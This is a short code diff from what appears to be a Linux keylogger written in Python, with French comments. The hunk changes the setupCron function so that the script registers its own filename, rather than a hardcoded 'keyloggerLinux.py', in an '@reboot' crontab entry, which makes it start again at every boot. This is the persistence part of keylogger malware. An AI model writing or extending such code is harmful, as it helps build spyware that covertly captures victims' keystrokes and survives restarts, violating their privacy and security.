@@ -3,7 +3,9 @@ import subprocess
 
 def setupCron():
     # Chemin vers le script Python
-    python_script = os.getcwd() + "/keyloggerLinux.py"
+
+    filename = os.path.basename(__file__)
+    python_script = os.getcwd() + "/" + filename
 
     # Commande crontab pour exécuter le script Python au démarrage
     cron_job = f"@reboot python3 {python_script}"
